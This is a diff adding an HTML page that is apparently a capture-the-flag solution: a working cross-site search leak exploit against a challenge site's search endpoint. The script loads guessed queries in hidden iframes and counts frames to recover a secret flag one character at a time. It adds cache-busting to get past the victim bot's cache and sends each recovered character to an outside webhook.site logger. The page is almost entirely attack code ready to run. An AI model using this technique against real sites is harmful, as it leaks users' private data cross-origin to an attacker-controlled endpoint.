@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const target = "https://wonder.cbd2026.cloud/search?q=";
+        const logger = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
+        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+
+        async function check(q) {
+            return new Promise(resolve => {
+                const ifr = document.createElement('iframe');
+                // Tambahkan random string agar tidak kena cache browser bot
+                ifr.src = `${target}${encodeURIComponent(q)}&cb=${Math.random()}`;
+                ifr.style.display = "none";
+                document.body.appendChild(ifr);
+                
+                setTimeout(() => {
+                    const isMatch = ifr.contentWindow.length > 0;
+                    document.body.removeChild(ifr);
+                    resolve(isMatch);
+                }, 1000);
+            });
+        }
+
+        async function solve(current) {
+            for (let c of alphabet) {
+                let guess = current + c;
+                if (await check(guess)) {
+                    fetch(`${logger}?found=${guess}`);
+                    if (c === '}') return;
+                    return solve(guess);
+                }
+            }
+        }
+        fetch(`${logger}?status=started`);
+        solve("cbd{");
+    </script>
+</body>
+</html>
